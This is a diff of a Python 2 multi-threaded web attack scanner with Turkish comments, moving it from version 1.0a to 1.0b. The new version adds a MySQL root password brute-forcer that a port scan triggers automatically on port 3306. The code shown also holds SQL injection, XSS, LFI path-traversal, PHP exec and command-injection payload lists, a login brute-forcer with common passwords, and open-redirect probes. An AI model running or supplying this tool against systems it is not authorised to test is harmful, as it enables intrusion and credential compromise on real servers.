@@ -1,6 +1,8 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-# 0x94 Scanner v1.0a [Python 2x]
+# 0x94 Scanner v1.0b
+#Python 2x sürümlerde çalışır.
+#mysql eklentisi gerekli onuda https://pypi.python.org/pypi/MySQL-python adresinden kurun
 #Multi Thread  POST|GET (BLIND/TIME BASED/HEADER/SQL) INJECTION - LFI -XSS SCANNER"
 #Sunucu IP adresi ve kullanilan http bilgisini alir
 #Sunucu Allow header listesini alir
@@ -52,6 +54,7 @@ from time import sleep
 import random
 import os
 import sre
+import MySQLdb
 
 
 # ---------- # AYARLAR BASLANGIC #--------------
@@ -104,6 +107,47 @@ aynilinkler={}
 limitlinkler={}
 
 
+
+def mysqlportubrute(ip):
+    
+	passlar=["admin",
+                "test",
+                "secret",
+                "guest",
+                "1234",
+                "123456",
+                "demo123",
+                "demo",
+                "password123",
+                "password1",
+                "qwerty",
+                "abc123",
+                "password1",
+                "administrator",
+                "12341234",
+                "111111",
+                "123456789",
+                "12345678",
+                "1234567",
+                "root",
+                "toor",
+                "pass123",
+                "pass1",
+                "pass2",
+                "pass",
+                "password2",
+                "123123",
+                "admin123",
+                "123admin"]   
+	
+	for mysqlportpass in passlar:
+	    try:
+		db=MySQLdb.connect(host=ip,user="root",passwd=mysqlportpass)
+		yaz("[#] Mysql 3306 Portu Giris Basarili user:root sifre:"+mysqlportpass,True)
+
+	    except(MySQLdb.Error):
+		print "Mysql brute basarisiz, Denenen:"+mysqlportpass
+		continue
 
 def wordpressbrute(url):
     
@@ -435,19 +479,19 @@ def formyaz(url):
 
 def sqlkodcalisiomu(url):
     
-    try:
-	
-	bitiskarakter=["","--","/*","--+",";",";--","--","#"]
-	
-	calisankod = ["or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
-	              "' or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
-	              "'+ (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns) +' ",
-	              "or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
-	              "' or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
-	              "SELECT CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)"
-	              "SELECT CHAR(48)||CHAR(120)||CHAR(57)||CHAR(52)||CHAR(120)||CHAR(120)||CHAR(120)||CHAR(33)||CHAR(33)||CHAR(33)||CHAR(33)",
-	              ]
-	for sep in bitiskarakter:
+    bitiskarakter=["","--","/*","--+",";",";--","--","#"]
+    
+    calisankod = ["or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
+                  "' or 1=1 and (select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(48),CHAR(120),CHAR(57),CHAR(52),CHAR(120),CHAR(120),CHAR(120),CHAR(33),CHAR(33),CHAR(33)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",
+                  "'+ (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns) +' ",
+                  "or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
+                  "' or (select convert(int,CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)) FROM syscolumns)",
+                  "SELECT CHAR(48)+CHAR(120)+CHAR(57)+CHAR(52)+CHAR(120)+CHAR(120)+CHAR(120)+CHAR(33)+CHAR(33)+CHAR(33)+CHAR(33)"
+                  "SELECT CHAR(48)||CHAR(120)||CHAR(57)||CHAR(52)||CHAR(120)||CHAR(120)||CHAR(120)||CHAR(33)||CHAR(33)||CHAR(33)||CHAR(33)",
+                  ]
+    for sep in bitiskarakter:
+	try:
+	    
 	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
 		calishal={}
 		calishal[key]=value+calisankod+sep
@@ -458,19 +502,19 @@ def sqlkodcalisiomu(url):
 	    if "0x94xxx!!!" in response:
 		yaz("[#] Calisan SQL KOD Bulundu "+ url+" \nVeri="+calisparametre,True)
 	    calishal.clear()
-		
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +url,True)
-
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
-	#yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-	#yaz(mesaj)   
-	
+	    
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +url,True)
     
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+	    #yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+	    #yaz(mesaj)   
+    
+
     
     
     
@@ -537,8 +581,9 @@ def phpexec(url):
     
     seperators = ["a;env","a);env","/e\0"]
     
-    try:
-	for sep in seperators:
+
+    for sep in seperators:
+	try:
 	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
 		phpexechal={}
 		phpexechal[key]=sep
@@ -547,17 +592,17 @@ def phpexec(url):
 	    urlac = urllib2.urlopen(url+"?"+phpexecparametre)
 	    response = urlac.read()
 	    execkontrol(response,url)
-	    
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] Exec Http 500 Dondu " +url,True)
-    
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
-	    #yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-		#yaz(mesaj)       
+	
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] Exec Http 500 Dondu " +url,True)
+	
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		#yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
 
 
 
@@ -568,9 +613,10 @@ def getcommandinj(url):
     
     command="ping localhost"
     
-    
-    try:
-	for sep in seperators:
+
+    for sep in seperators:
+	
+	try:	    
 	    for key,value in urlparse.parse_qs(urlparse.urlparse(url).query, True).items():
 		cmdhal={}
 		cmdhal[key]=sep+command
@@ -584,16 +630,17 @@ def getcommandinj(url):
 	
 	    if len(msler)>=3:
 		yaz("[#] GET Command injection Bulundu "+ url+" \nVeri="+cmdparametre,True)
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] GET Command Injection Http 500 Dondu " +url,True)
-    
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
-	    #yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-		#yaz(mesaj)       
+		
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] GET Command Injection Http 500 Dondu " +url,True)
+	
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		#yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
 
 
 
@@ -649,13 +696,14 @@ def loginbrute(url,params,method):
 	         "admin123",
 	         "123admin"] 
 	
-	
-	try:
+
 	    
 	    
-	    dictb1={}
-	    dictb1=params.copy()
-	    for key,value in params.items():		
+	dictb1={}
+	dictb1=params.copy()
+	for key,value in params.items():
+	    
+	    try:		
 		if key in dictb1:
 		    if key.lower()=="user" or \
 		    key.lower()=="pass" or \
@@ -668,67 +716,67 @@ def loginbrute(url,params,method):
 		    key.lower()=="id":
 			dictb1[key]="0x94"
 		    
-	    parametrebrute1 = urllib.urlencode(dictb1)
-	    if method=="GET":
-		print "Login Brute GET testi yapiliyor"
-		loginnormal = temizle(urllib.urlopen(url+"?"+parametrebrute1,timeout=90).read())
-			
-	    else:
-		print "Login Brute POST testi yapiliyor"
-		loginnormal = temizle(urllib2.urlopen(url, parametrebrute1,timeout=90).read())		  
-		
-		
-    
-	    dictlogin={}
-	    dictlogin=params.copy()
-	    for gelenpass in passlar:
-		for key,value in params.items():		
-		    if key in dictlogin:
-			if key.lower()=="user" or \
-			key.lower()=="usr" or \
-			key.lower()=="username" or \
-			key.lower()=="userinput" or \
-			key.lower()=="usernameinput" or \
-			key.lower()=="uname" or \
-			key.lower()=="id":
-			    dictlogin[key]="admin"
-			    
-			if key.lower()=="pass" or \
-			key.lower()=="password" or \
-			key.lower()=="passwd" or \
-			key.lower()=="passinput" or \
-			key.lower()=="passwordinput" or \
-			key.lower()=="pwd":
-			    dictlogin[key]=gelenpass
-			
-		loginsaf = urllib.urlencode(dictlogin)
+		parametrebrute1 = urllib.urlencode(dictb1)
 		if method=="GET":
 		    print "Login Brute GET testi yapiliyor"
-		    brutekaynak = temizle(urllib.urlopen(url+"?"+loginsaf,timeout=90).read())
-		    dictlogin.clear()
-		    dictlogin=params.copy()
+		    loginnormal = temizle(urllib.urlopen(url+"?"+parametrebrute1,timeout=90).read())
 			    
 		else:
 		    print "Login Brute POST testi yapiliyor"
-		    brutekaynak = temizle(urllib2.urlopen(url, loginsaf,timeout=90).read())
-		    dictlogin.clear()
-		    dictlogin=params.copy()	
-		    if loginnormal!=brutekaynak:
-			yaz(" [#] Login Brute Degisiklik Yakaladi "+url+" \n Veri="+loginsaf,True)
+		    loginnormal = temizle(urllib2.urlopen(url, parametrebrute1,timeout=90).read())		  
+		    
+		    
+	
+		dictlogin={}
+		dictlogin=params.copy()
+		for gelenpass in passlar:
+		    for key,value in params.items():		
+			if key in dictlogin:
+			    if key.lower()=="user" or \
+			    key.lower()=="usr" or \
+			    key.lower()=="username" or \
+			    key.lower()=="userinput" or \
+			    key.lower()=="usernameinput" or \
+			    key.lower()=="uname" or \
+			    key.lower()=="id":
+				dictlogin[key]="admin"
+				
+			    if key.lower()=="pass" or \
+			    key.lower()=="password" or \
+			    key.lower()=="passwd" or \
+			    key.lower()=="passinput" or \
+			    key.lower()=="passwordinput" or \
+			    key.lower()=="pwd":
+				dictlogin[key]=gelenpass
+			    
+		    loginsaf = urllib.urlencode(dictlogin)
+		    if method=="GET":
+			print "Login Brute GET testi yapiliyor"
+			brutekaynak = temizle(urllib.urlopen(url+"?"+loginsaf,timeout=90).read())
+			dictlogin.clear()
+			dictlogin=params.copy()
+				
+		    else:
+			print "Login Brute POST testi yapiliyor"
+			brutekaynak = temizle(urllib2.urlopen(url, loginsaf,timeout=90).read())
+			dictlogin.clear()
+			dictlogin=params.copy()	
+			if loginnormal!=brutekaynak:
+			    yaz(" [#] Login Brute Degisiklik Yakaladi "+url+" \n Veri="+loginsaf,True)
 		
     
-	except urllib2.HTTPError,e:
-	    print e.reason
-	    if(e.code==500):
-		yaz("[#] "+method+" Login Brute Http 500 Dondu   \n" +url,True)
-	    
-	except urllib2.URLError,  e:
-	    if "Time" in e.reason:
-		mesaj="Cok bekledi =  %s , %s \n" %(url,"Login Brute")
-		yaz(mesaj,True)
-	except:
-	    mesaj="Bilinmeyen hata olustu\n"
-	    #yaz(mesaj)       
+	    except urllib2.HTTPError,e:
+		print e.reason
+		if(e.code==500):
+		    yaz("[#] "+method+" Login Brute Http 500 Dondu   \n" +url,True)
+		
+	    except urllib2.URLError,  e:
+		if "Time" in e.reason:
+		    mesaj="Cok bekledi =  %s , %s \n" %(url,"Login Brute")
+		    yaz(mesaj,True)
+	    except:
+		mesaj="Bilinmeyen hata olustu\n"
+		#yaz(mesaj)       
 	    
 		    
 
@@ -951,25 +999,25 @@ def openredirect(gelenurl):
               "//https://www.google.com",
               "5;URL='https://www.google.com'"]
     
-    try:
-	for rlinkler in redirect:
-	    
+    for rlinkler in redirect:
+	try:
+	
 	    urlnormal=gelenurl.replace("=", "="+rlinkler+"?")
 	    urlac = urllib2.urlopen(urlnormal)
 	    response = urlac.read()
 	    if "<title>Google</title>" in response:
 		yaz("[#] Open Redirect BULUNDU : " + urlnormal,True)
-    
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] Open Redirect 500 Dondu " +urlnormal,True)
-    
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
-	    #yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"   
-	    
+
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] Open Redirect 500 Dondu " +urlnormal,True)
+	
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+		#yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"   
+	
 
 def headerinjection(url):
     try:
@@ -1437,13 +1485,13 @@ def blindpost(url,params,method):
 		
 
 def postget(url, params, method):
-
-    try:
 	
-	postgetdict={}
-	postgetdict=params.copy()
+    postgetdict={}
+    postgetdict=params.copy()
+    
+    for key,value in params.items():
 	
-	for key,value in params.items():
+	try:	    
 	    if key in postgetdict:
 		
 		postgetdict[key]=value+"'"
@@ -1457,19 +1505,19 @@ def postget(url, params, method):
 		sqlkontrol (temizle(f.read()),"[#] SQL ERROR BULUNDU \n LINK = "+url+"\n Veri= "+parametre)
 		postgetdict.clear()
 		postgetdict=params.copy()		
-		
+	    
 
-	
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
-	
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
-		#yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-		#yaz(mesaj)       
+    
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("POST "+method+" Http 500 Dondu  / Internal Server Error \n Yollanan Data ="+parametre+ "\n"+urlnormal,True)
+	    
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,url)
+		    #yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
     
 
 
@@ -1527,6 +1575,7 @@ def comparePages(page1,page2,deurl,info):
 		
 		
 def sqlkontrol(response,urlnormal):
+    
     print "SQL hata mesaji kontrol ediliyor"
     if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
 	mesaj= "[#] %s MS-SQL Server error" % urlnormal
@@ -1740,29 +1789,29 @@ def xsstest(xsstesturl):
 def xsstara(xssurl):
     
     xsspayload=["\"><script>alert(0x000123)</script>",
-                "\"><sCriPt>alert(0x000123)</sCriPt>",
-                "\"; alert(0x000123)",
-                "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
-                "\"><img Src=0x94 onerror=alert(0x000123)>",
-                "\"><BODY ONLOAD=alert(0x000123)>",
-                "\"><IMG SRC=\"javascript:alert(0x000123);\">",
-                "\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x000123);\">",
-                "'%2Balert(0x000123)%2B'",
-                "\"><0x000123>",
-                "'+alert(0x000123)+'",
-                "%2Balert(0x000123)%2B'",
-                "'\"--></style></script><script>alert(0x000123)</script>",
-                "'</style></script><script>alert(0x000123)</script>",
-                "</script><script>alert(0x000123)</script>",
-                "</style></script><script>alert(0x000123)</script>",
-                "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
-                "'\"--></style></script><script>alert(0x000123)</script>",
-                "';alert(0x000123)'",
-                "<scr<script>ipt>alert(0x000123)</script>",
-                "<scr<script>ipt>alert(0x000123)</scr</script>ipt>"]
-    
-    try:
-	for xssler in xsspayload:
+        "\"><sCriPt>alert(0x000123)</sCriPt>",
+        "\"; alert(0x000123)",
+        "\"></sCriPt><sCriPt >alert(0x000123)</sCriPt>",
+        "\"><img Src=0x94 onerror=alert(0x000123)>",
+        "\"><BODY ONLOAD=alert(0x000123)>",
+        "\"><IMG SRC=\"javascript:alert(0x000123);\">",
+        "\"><INPUT TYPE='IMAGE' SRC=\"javascript:alert(0x000123);\">",
+        "'%2Balert(0x000123)%2B'",
+        "\"><0x000123>",
+        "'+alert(0x000123)+'",
+        "%2Balert(0x000123)%2B'",
+        "'\"--></style></script><script>alert(0x000123)</script>",
+        "'</style></script><script>alert(0x000123)</script>",
+        "</script><script>alert(0x000123)</script>",
+        "</style></script><script>alert(0x000123)</script>",
+        "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3E0x94(0x000123)%3C",
+        "'\"--></style></script><script>alert(0x000123)</script>",
+        "';alert(0x000123)'",
+        "<scr<script>ipt>alert(0x000123)</script>",
+        "<scr<script>ipt>alert(0x000123)</scr</script>ipt>"]
+
+    for xssler in xsspayload:
+	try:	    
 	    print "XSS Taraniyor ... "
 	    urlnormal=xssurl.replace("=", "="+xssler)
 	    urlac = urllib2.urlopen(urlnormal)
@@ -1773,16 +1822,16 @@ def xsstara(xssurl):
 		    yaz("[#] XSS BULUNDU : " + urlnormal,True)
 		else:
 		    yaz("[#] XSS BULUNDU ve Satirda XSS korumasi var : " + urlnormal,True)
-		   
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +urlnormal,True)
-    
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
-	    #yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"    
+	       
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] XSS Http 500 Dondu  / Internal Server Error " +urlnormal,True)
+	
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+		#yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"    
 
 def lfitara(lfibul):
     
@@ -1924,8 +1973,8 @@ def lfitara(lfibul):
         "../../../../../../../../../../../../../../../../windows/iis6.log",
         "../../../../../../../../../../../../../../../../../windows/iis6.log"]
 	
-    try:
-	for lfidizin in lfiyollar:
+    for lfidizin in lfiyollar:
+	try:
 	    for key,value in urlparse.parse_qs(urlparse.urlparse(lfibul).query, True).items():
 		lfilihal={}
 		lfilihal[key]=lfidizin
@@ -1935,26 +1984,27 @@ def lfitara(lfibul):
 		urlac = urllib2.urlopen(lfibul+"?"+lfiparametre)
 		response = temizle(urlac.read())
 		if "root:" in response or \
-		"noexecute=optout" in response or \
-		"0x9411111" in response:
+	        "noexecute=optout" in response or \
+	        "0x9411111" in response:
 		    yaz("[#] LFI BULUNDU : " + lfibul,True)
 		
 		elif "OC_INIT_COMPONENT" in response or \
-		"C:\WINDOWS\system32\Setup\iis.dll" in response:
+	        "C:\WINDOWS\system32\Setup\iis.dll" in response:
 		    yaz("[#] ASP LFI BULUNDU : " + lfibul,True)
 		    
 		   
 		lfilihal.clear()
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +lfibul,True)
-    
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,lfibul)
-	    #yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-		#yaz(mesaj)       
+		
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] LFI Http 500 Dondu  / Internal Server Error " +lfibul,True)
+	
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,lfibul)
+		#yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+		    #yaz(mesaj)       
     
 
 def lfitest(lfiurl):
@@ -1988,27 +2038,27 @@ def lfitest(lfiurl):
     
 
 def sql(urlnormal):
-    try:
-	
-	sqlt = ["'", "\"", "\xBF'\"(", "(", ")"]
-	for sqlpay in sqlt:
+
+    sqlt = ["'", "\"", "\xBF'\"(", "(", ")"]
+    for sqlpay in sqlt:
+	try:
 	    print "SQL Test Taraniyor ... "+sqlpay
 	    urlnormal=urlnormal.replace("=", "="+sqlpay)
 	    urlac = urllib2.urlopen(urlnormal)
 	    response = temizle(urlac.read())
 	    sqlkontrol(response,urlnormal)
-	
-    except urllib2.HTTPError,  e:
-	if(e.code==500):
-	    yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +urlnormal,True)
-	    sqlkontrol(e.read(),urlnormal)
-
-    except urllib2.URLError,  e:
-	mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
-	#yaz(mesaj)
-    except:
-	mesaj="Bilinmeyen hata olustu\n"
-	#yaz(mesaj)   
+    
+	except urllib2.HTTPError,  e:
+	    if(e.code==500):
+		yaz("[#] SQL Http 500 Dondu  / Internal Server Error " +urlnormal,True)
+		sqlkontrol(e.read(),urlnormal)
+    
+	except urllib2.URLError,  e:
+	    mesaj="Hata olustu , sebebi =  %s - %s \n" %(e.reason,urlnormal)
+	    #yaz(mesaj)
+	except:
+	    mesaj="Bilinmeyen hata olustu\n"
+	    #yaz(mesaj)   
 	
 
 def blind(urlblind):
@@ -2083,8 +2133,7 @@ def blind(urlblind):
 
 def portbanner(host):
     
-    
-    print host
+
     #portlist = [21,22,23,25,53,69,80,110,137,139,443,445,3306,3389,5432,5900,8080,1433]
     
     portlist= [21, 22, 23, 25, 42, 43, 53, 67, 79, 80, 102, 110, 115, 119, 123, 135, 137, 143, 161, 179, 379, 389, 443, 445, 465, 636, 993, 995, 1026, 1080, 1090, 1433, 1434, 1521, 1677, 1701, 1720, 1723, 1900, 2409, 3101, 3306, 3389, 3390, 3535, 4321, 4664, 5190, 5500, 5631, 5632, 5900, 7070, 7100, 8000, 8080, 8799, 8880, 9100, 19430, 39720]
@@ -2110,7 +2159,10 @@ def portbanner(host):
 	    sock.settimeout(3)
 	    ver = sock.connect_ex((ip, portlar)) 
 	    if ver!=10061:
-		print str(portlar)+" Portu "+status[ver]+"\n Data : "+sock.recv(1024)
+		yaz("[#] "+str(portlar)+" Portu "+status[ver]+"\n Data : "+sock.recv(1024),True)
+		if portlar==3306 and status[0]:
+		    mysqlportubrute(ip)
+		    
 	    sock.close()
 	except socket.timeout:
 	    print ""
